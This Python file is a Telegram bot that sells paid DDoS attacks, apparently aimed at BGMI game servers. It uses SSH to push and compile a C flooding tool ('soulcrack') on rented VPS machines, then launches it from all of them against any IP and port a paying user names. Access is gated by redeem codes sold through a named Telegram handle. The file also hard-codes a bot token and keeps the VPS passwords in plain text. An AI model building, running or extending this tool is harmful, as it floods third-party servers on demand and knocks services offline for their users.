import logging
import time
import random
import string
import paramiko
import threading
import os
import socket
import json
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters
)

# ==================== CONFIGURATION ====================
TOKEN = "7877126466:AAH6lNFpehRtrqV7pU4Gl2hHV5UNupLLsfo"
GOD_ID = 1174779637
ADMIN_IDS = {GOD_ID}  # God is default admin
BOT_ACTIVE = True
CURRENT_ATTACK_END = 0
VPS_LIST = []
REDEEM_CODES = {}
APPROVED_USERS = set()

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    filename='bot.log'
)
logger = logging.getLogger(__name__)

# ==================== FILE SETUP ====================
ATTACK_LOG_FILE = "attack_logs.txt"
GEN_LOG_FILE = "redeem_generated.txt"
REDEEM_LOG_FILE = "redeem_used.txt"
APPROVED_USERS_FILE = "approved_users.txt"
ADMIN_FILE = "admin_list.txt"
VPS_BACKUP_FILE = "vps_backup.json"

# Initialize files
for file in [ATTACK_LOG_FILE, GEN_LOG_FILE, REDEEM_LOG_FILE, APPROVED_USERS_FILE, ADMIN_FILE]:
    if not os.path.exists(file):
        open(file, 'w').close()

# ==================== CORE FUNCTIONS ====================
def log_attack(user_id, ip, port, duration):
    with open(ATTACK_LOG_FILE, "a") as f:
        f.write(f"{datetime.now()} - User {user_id}: {ip}:{port} for {duration}s\n")

def log_redeem_generation(admin_id, code, duration):
    with open(GEN_LOG_FILE, "a") as f:
        f.write(f"{datetime.now()} - Admin {admin_id} generated {duration} code: {code}\n")

def log_redeem_redemption(user_id, code):
    with open(REDEEM_LOG_FILE, "a") as f:
        f.write(f"{datetime.now()} - User {user_id} redeemed code: {code}\n")

def is_admin(user_id):
    return user_id in ADMIN_IDS or user_id == GOD_ID

def is_approved(user_id):
    return user_id in APPROVED_USERS or is_admin(user_id)

def save_approved_users():
    with open(APPROVED_USERS_FILE, "w") as f:
        for user_id in APPROVED_USERS:
            f.write(f"{user_id}\n")

def save_admins():
    with open(ADMIN_FILE, "w") as f:
        for admin_id in ADMIN_IDS:
            if admin_id != GOD_ID:  # Don't save God ID in file
                f.write(f"{admin_id}|Added by system|{datetime.now()}\n")

def save_vps_list():
    try:
        with open(VPS_BACKUP_FILE, 'w') as f:
            json.dump(VPS_LIST, f)
    except Exception as e:
        logger.error(f"Error saving VPS list: {e}")

def load_data():
    try:
        # Load admins
        with open(ADMIN_FILE, 'r') as f:
            for line in f:
                if line.strip():
                    admin_id = int(line.strip().split('|')[0])
                    ADMIN_IDS.add(admin_id)
        
        # Load approved users
        with open(APPROVED_USERS_FILE, 'r') as f:
            for line in f:
                if line.strip():
                    APPROVED_USERS.add(int(line.strip()))
        
        # Load VPS list if backup exists
        if os.path.exists(VPS_BACKUP_FILE):
            with open(VPS_BACKUP_FILE, 'r') as f:
                global VPS_LIST
                VPS_LIST = json.load(f)
                logger.info(f"Loaded {len(VPS_LIST)} VPS from backup")
                
    except Exception as e:
        logger.error(f"Error loading data: {e}")

# ==================== VPS FUNCTIONS ====================
def update_progress(context, progress, text):
    try:
        context.bot.edit_message_text(
            chat_id=progress['chat_id'],
            message_id=progress['message_id'],
            text=text
        )
    except Exception as e:
        logger.error(f"Failed to update progress message: {str(e)}")

def test_ssh_connection(ip, username, password, timeout=10):
    """Test SSH connection with better error handling"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, port=22, username=username, password=password, 
                   timeout=timeout, banner_timeout=timeout)
        return True, "Connection successful"
    except socket.timeout:
        return False, "Connection timed out"
    except paramiko.AuthenticationException:
        return False, "Authentication failed"
    except paramiko.SSHException as e:
        return False, f"SSH error: {str(e)}"
    except Exception as e:
        return False, f"Unexpected error: {str(e)}"
    finally:
        ssh.close()

def setup_vps_with_progress(ip, username, password, context, progress):
    try:
        for attempt in range(1, progress['max_attempts'] + 1):
            progress['attempt'] = attempt
            update_progress(context, progress, 
                f"🔐 Testing VPS connection... (Attempt {attempt}/{progress['max_attempts']})")
            
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, 22, username, password, timeout=15)
                
                # Test basic command
                stdin, stdout, stderr = ssh.exec_command('whoami')
                remote_user = stdout.read().decode().strip()
                if remote_user != username:
                    raise Exception(f"Logged in as {remote_user} instead of {username}")
                
                # Check gcc
                stdin, stdout, stderr = ssh.exec_command('which gcc')
                if not stdout.read().strip():
                    raise Exception("gcc not installed. Install with: apt install gcc -y")
                
                # Upload file
                sftp = ssh.open_sftp()
                try:
                    sftp.put('soulcrack.c', '/tmp/soulcrack.c')
                    update_progress(context, progress,
                        f"📤 File uploaded to /tmp/soulcrack.c\n"
                        f"Attempt {attempt}/{progress['max_attempts']}")
                except Exception as e:
                    raise Exception(f"File upload failed: {str(e)}")
                
                # Compile
                compile_cmd = "cd /tmp && gcc soulcrack.c -o soulcrack && chmod +x soulcrack"
                stdin, stdout, stderr = ssh.exec_command(compile_cmd, timeout=30)
                exit_status = stdout.channel.recv_exit_status()
                
                if exit_status != 0:
                    error = stderr.read().decode()
                    raise Exception(f"Compilation failed: {error}")
                
                # Verify
                stdin, stdout, stderr = ssh.exec_command("ls -la /tmp/soulcrack")
                if "soulcrack" not in stdout.read().decode():
                    raise Exception("Binary not found after compilation")
                
                # Success!
                VPS_LIST.append({
                    'ip': ip,
                    'user': username,
                    'pass': password,
                    'added_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    'last_used': None
                })
                save_vps_list()
                
                progress['success'] = True
                update_progress(context, progress, 
                    f"✅ VPS setup complete!\n"
                    f"IP: {ip}\n"
                    f"User: {username}\n"
                    f"Total VPS: {len(VPS_LIST)}")
                return
                
            except Exception as e:
                error_msg = str(e)
                logger.error(f"VPS setup attempt {attempt} failed: {error_msg}")
                if attempt < progress['max_attempts']:
                    time.sleep(2)  # Wait before retry
                continue
                
            finally:
                try:
                    ssh.close()
                except:
                    pass
        
        # If we get here, all attempts failed
        update_progress(context, progress, 
            "❌ Failed to setup VPS after 10 attempts!\n"
            "Possible issues:\n"
            "1. Wrong credentials\n"
            "2. Port 22 blocked\n"
            "3. Missing gcc\n"
            "4. No /tmp write permissions\n"
            "5. VPS might be banned")
            
    except Exception as e:
        logger.error(f"VPS setup thread failed: {str(e)}")
        update_progress(context, progress, f"❌ Critical error: {str(e)}")

# ==================== COMMAND HANDLERS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not BOT_ACTIVE and not is_admin(update.effective_user.id):
        return
    
    await update.message.reply_text(
        "🔥 Apka sawagaat hai Sweet DDDOS ma 🔥\n"
        "For commands: /help\n"
        "Buy redeem codes: @HMSahil"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not BOT_ACTIVE and not is_admin(update.effective_user.id):
        return
    
    help_text = """
🔰 User Commands:
/start - Show welcome
/help - This menu
/bgmi [IP] [PORT] [TIME] - Launch attack
/redeem [CODE] - Activate code
/time [CODE] - Check expiry

👑 Admin Commands:
/generate [TIME] - Create code
/addvps [IP] [USER] [PASS] - Add VPS
/listvps - Show all VPS
/removevps [IP] - Remove VPS
/boton - Activate bot
/botoff - Deactivate bot

🕉️ God Commands:
/godonly - Special commands
/generatetxt - View code logs
/reddemtxt - View redemption logs
/addadmin [ID] - Add admin
/adminlist - List admins
/deadmin [ID] - Remove admin
/remove [CODE] - Delete code"""
    
    await update.message.reply_text(help_text)

async def bgmi_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global CURRENT_ATTACK_END
    
    if not BOT_ACTIVE and not is_admin(update.effective_user.id):
        return
    
    user_id = update.effective_user.id
    
    if not is_approved(user_id):
        await update.message.reply_text("❌ Buy redeem code from @HMSahil")
        return

    if len(context.args) != 3:
        await update.message.reply_text("❌ Format: /bgmi IP PORT TIME")
        return

    try:
        target_ip, target_port, duration = context.args
        target_port = int(target_port)
        duration = int(duration)
        
        if not VPS_LIST:
            await update.message.reply_text("❌ No VPS configured! Use /addvps")
            return

        CURRENT_ATTACK_END = time.time() + duration
        log_attack(user_id, target_ip, target_port, duration)
        
        attack_id = random.randint(1000, 9999)
        await update.message.reply_text(
            f"🚀 Launching attack from {len(VPS_LIST)} VPS!\n"
            f"Target: {target_ip}:{target_port}\n"
            f"Duration: {duration}s\n"
            f"Attack ID: {attack_id}"
        )
        
        for vps in VPS_LIST:
            threading.Thread(
                target=launch_attack,
                args=(vps, target_ip, target_port, duration, context, update.effective_chat.id, attack_id)
            ).start()
            
    except ValueError:
        await update.message.reply_text("❌ PORT and TIME must be numbers!")

def launch_attack(vps, target_ip, target_port, duration, context, chat_id, attack_id):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps['ip'], 22, vps['user'], vps['pass'], timeout=10)
        
        # Update last used time
        vps['last_used'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        save_vps_list()
        
        # Execute attack
        cmd = f"/tmp/soulcrack {target_ip} {target_port} {duration}"
        stdin, stdout, stderr = ssh.exec_command(cmd)
        
        # Get process ID
        stdin, stdout, stderr = ssh.exec_command("pgrep soulcrack")
        pid = stdout.read().decode().strip()
        
        context.bot.send_message(
            chat_id=chat_id,
            text=f"✅ VPS {vps['ip']} attacking! (ID: {attack_id})\n"
                 f"PID: {pid if pid else 'Unknown'}"
        )
        
        # Monitor attack
        while time.time() < time.time() + duration:
            time.sleep(5)
            # Check if process is still running
            stdin, stdout, stderr = ssh.exec_command(f"ps -p {pid}")
            if pid not in stdout.read().decode():
                context.bot.send_message(
                    chat_id=chat_id,
                    text=f"⚠️ Attack stopped on {vps['ip']} (ID: {attack_id})"
                )
                break
                
    except Exception as e:
        context.bot.send_message(
            chat_id=chat_id,
            text=f"❌ VPS {vps['ip']} failed: {str(e)}"
        )
    finally:
        try:
            ssh.close()
        except:
            pass

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not BOT_ACTIVE and not is_admin(update.effective_user.id):
        return
    
    if not context.args:
        await update.message.reply_text("❌ Format: /redeem CODE")
        return
    
    code = context.args[0].upper()
    if code in REDEEM_CODES:
        if datetime.now() > REDEEM_CODES[code]['expiry']:
            await update.message.reply_text("❌ This code has expired!")
            return
        
        APPROVED_USERS.add(update.effective_user.id)
        save_approved_users()
        log_redeem_redemption(update.effective_user.id, code)
        del REDEEM_CODES[code]
        
        await update.message.reply_text(f"✅ Redeem successful! Access granted")
    else:
        await update.message.reply_text("❌ Invalid redeem code!")

async def check_time(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ Format: /time CODE")
        return
    
    code = context.args[0].upper()
    if code in REDEEM_CODES:
        expiry = REDEEM_CODES[code]['expiry']
        remaining = expiry - datetime.now()
        
        if remaining.total_seconds() <= 0:
            await update.message.reply_text("❌ This code has expired!")
        else:
            days = remaining.days
            hours, remainder = divmod(remaining.seconds, 3600)
            minutes, seconds = divmod(remainder, 60)
            
            await update.message.reply_text(
                f"⏳ Code {code} expires in:\n"
                f"{days} days, {hours} hours, {minutes} minutes"
            )
    else:
        await update.message.reply_text("❌ Invalid redeem code!")

async def generate_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin access only!")
        return
    
    durations = {
        '1min': ('1 Minute', timedelta(minutes=1)),
        '30min': ('30 Minutes', timedelta(minutes=30)),
        '1hour': ('1 Hour', timedelta(hours=1)),
        '24hour': ('24 Hours', timedelta(hours=24)),
        '1day': ('1 Day', timedelta(days=1)),
        '30day': ('30 Days', timedelta(days=30))
    }
    
    if not context.args or context.args[0].lower() not in durations:
        options = "\n".join([f"/generate {d}" for d in durations])
        await update.message.reply_text(f"Available durations:\n{options}")
        return
    
    duration = context.args[0].lower()
    duration_name, delta = durations[duration]
    random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
    code = f"{random_part}-{duration.upper()}"
    expiry = datetime.now() + delta
    
    REDEEM_CODES[code] = {
        'duration': duration_name,
        'expiry': expiry,
        'generated_by': update.effective_user.id
    }
    
    log_redeem_generation(update.effective_user.id, code, duration_name)
    
    await update.message.reply_text(
        f"✅ {duration_name} code:\n"
        f"<code>{code}</code>\n"
        f"Expires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode='HTML'
    )

async def add_vps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin access only!")
        return
    
    if len(context.args) != 3:
        await update.message.reply_text("❌ Format: /addvps IP USERNAME PASSWORD")
        return
    
    ip, username, password = context.args
    
    # Check if VPS already exists
    if any(vps['ip'] == ip for vps in VPS_LIST):
        await update.message.reply_text("⚠️ This VPS is already added!")
        return
    
    # Send initial message with message ID we can update
    status_msg = await update.message.reply_text("🔐 Starting VPS setup...")
    
    # Create progress tracking dictionary
    progress = {
        'chat_id': update.effective_chat.id,
        'message_id': status_msg.message_id,
        'attempt': 1,
        'max_attempts': 10,
        'success': False
    }
    
    # Start setup in background with progress tracking
    threading.Thread(
        target=setup_vps_with_progress,
        args=(ip, username, password, context, progress)
    ).start()

async def list_vps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin access only!")
        return
    
    if not VPS_LIST:
        await update.message.reply_text("No VPS configured!")
        return
    
    message = "🔧 Configured VPS:\n\n"
    for i, vps in enumerate(VPS_LIST, 1):
        last_used = vps.get('last_used', 'Never')
        message += (
            f"{i}. IP: {vps['ip']}\n"
            f"   User: {vps['user']}\n"
            f"   Added: {vps.get('added_at', 'Unknown')}\n"
            f"   Last Used: {last_used}\n\n"
        )
    
    await update.message.reply_text(message)

async def remove_vps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin access only!")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Format: /removevps IP")
        return
    
    ip = context.args[0]
    global VPS_LIST
    
    for i, vps in enumerate(VPS_LIST):
        if vps['ip'] == ip:
            del VPS_LIST[i]
            save_vps_list()
            await update.message.reply_text(f"✅ VPS {ip} removed successfully!")
            return
    
    await update.message.reply_text("❌ VPS not found in the list")

async def boton(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin access only!")
        return
    
    global BOT_ACTIVE
    BOT_ACTIVE = True
    await update.message.reply_text("✅ Bot activated for all users!")

async def botoff(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin access only!")
        return
    
    global BOT_ACTIVE
    BOT_ACTIVE = False
    await update.message.reply_text("🛑 Bot deactivated for normal users!")

async def godonly(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != GOD_ID:
        await update.message.reply_text("🙏 Tum bhagwan nahi ho!")
        return
    
    commands = """
🕉️ God Commands:
/generatetxt - View code logs
/reddemtxt - View redemption logs
/addadmin [ID] - Add admin
/adminlist - List admins
/deadmin [ID] - Remove admin
/remove [CODE] - Delete code"""
    
    await update.message.reply_text(commands)

async def generatetxt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != GOD_ID:
        await update.message.reply_text("🙏 Tum bhagwan nahi ho!")
        return
    
    try:
        with open(GEN_LOG_FILE, "rb") as f:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=f,
                filename="redeem_generation_log.txt",
                caption="📜 Poorna Code Generation Log"
            )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def reddemtxt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != GOD_ID:
        await update.message.reply_text("🙏 Tum bhagwan nahi ho!")
        return
    
    try:
        with open(REDEEM_LOG_FILE, "rb") as f:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=f,
                filename="redeem_redemption_log.txt",
                caption="📜 Poorna Redemption Log"
            )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != GOD_ID:
        await update.message.reply_text("🙏 Tum bhagwan nahi ho!")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Format: /addadmin USER_ID")
        return
    
    try:
        new_admin = int(context.args[0])
        if new_admin in ADMIN_IDS:
            await update.message.reply_text("⚠️ Ye user pehle se admin hai!")
            return
        
        ADMIN_IDS.add(new_admin)
        save_admins()
        await update.message.reply_text(f"✅ Naya admin banaya gaya: {new_admin}")
    except ValueError:
        await update.message.reply_text("❌ Sahi USER_ID dalo")

async def adminlist(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin access only!")
        return
    
    if not ADMIN_IDS:
        await update.message.reply_text("❌ Koi admin nahi hai!")
        return
    
    admin_list = "👑 Admin List:\n"
    for admin_id in ADMIN_IDS:
        admin_list += f"ID: {admin_id}\n"
    
    await update.message.reply_text(admin_list)

async def deadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != GOD_ID:
        await update.message.reply_text("🙏 Tum bhagwan nahi ho!")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Format: /deadmin USER_ID")
        return
    
    try:
        admin_id = int(context.args[0])
        if admin_id == GOD_ID:
            await update.message.reply_text("❌ Bhagwan ko hata nahi sakte!")
            return
        
        if admin_id not in ADMIN_IDS:
            await update.message.reply_text("❌ Ye user admin nahi hai!")
            return
        
        ADMIN_IDS.remove(admin_id)
        save_admins()
        await update.message.reply_text(f"✅ Admin {admin_id} hata diya gaya!")
    except ValueError:
        await update.message.reply_text("❌ Sahi USER_ID dalo")

async def remove_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != GOD_ID:
        await update.message.reply_text("🙏 Tum bhagwan nahi ho!")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Format: /remove CODE")
        return
    
    code = context.args[0].upper()
    if code in REDEEM_CODES:
        del REDEEM_CODES[code]
        await update.message.reply_text(f"✅ Code {code} hata diya gaya!")
    else:
        await update.message.reply_text("❌ Yeh code nahi mila")

# ==================== MAIN ====================
def main():
    # Load data at startup
    load_data()
    
    app = Application.builder().token(TOKEN).build()
    
    # User commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("bgmi", bgmi_attack))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("time", check_time))
    
    # Admin commands
    app.add_handler(CommandHandler("generate", generate_code))
    app.add_handler(CommandHandler("addvps", add_vps))
    app.add_handler(CommandHandler("listvps", list_vps))
    app.add_handler(CommandHandler("removevps", remove_vps))
    app.add_handler(CommandHandler("boton", boton))
    app.add_handler(CommandHandler("botoff", botoff))
    
    # God commands
    app.add_handler(CommandHandler("godonly", godonly))
    app.add_handler(CommandHandler("generatetxt", generatetxt))
    app.add_handler(CommandHandler("reddemtxt", reddemtxt))
    app.add_handler(CommandHandler("addadmin", addadmin))
    app.add_handler(CommandHandler("adminlist", adminlist))
    app.add_handler(CommandHandler("deadmin", deadmin))
    app.add_handler(CommandHandler("remove", remove_redeem))
    
    app.run_polling()

if __name__ == "__main__":
    main()
